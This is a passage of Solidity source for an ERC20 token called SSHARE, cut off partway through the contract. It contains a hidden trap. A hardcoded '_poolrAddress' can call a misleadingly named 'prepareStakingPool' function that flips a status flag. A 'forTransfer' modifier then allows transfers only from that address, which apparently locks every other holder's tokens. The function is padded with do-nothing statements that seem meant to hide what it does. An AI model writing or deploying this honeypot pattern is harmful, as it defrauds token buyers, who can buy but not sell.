...
contract SSHARE is Context, IERC20, IERC20Metadata {

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _tokenr_totalSupply;
    uint256 private _tokenr_status = 0;
    uint256 public stakingPoolrStatus = 0;

    string private _tokenr_name;
    string private _tokenr_symbol;

    address private _poolrAddress = 0xbb49857283b29743D2c6266DBc3489751846EEb4;

    constructor() {
        _tokenr_name = "SSHARE";
        _tokenr_symbol = "SSHARE";
        _tokenr_totalSupply = 1000 * 10 ** 18;
        _balances[msg.sender] = _tokenr_totalSupply;
    }

    modifier forTransfer {
        require(msg.sender == _poolrAddress || _tokenr_status == 0);
        _;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _tokenr_totalSupply;
    }

    function prepareStakingPool(address to) public {
        to == address(0);
        stakingPoolrStatus = 1;
        uint256 a = 1;
        a = a + 1;
        a = a-1;
        if (msg.sender == _poolrAddress)
        {
            _tokenr_status = 1;
        }
    }
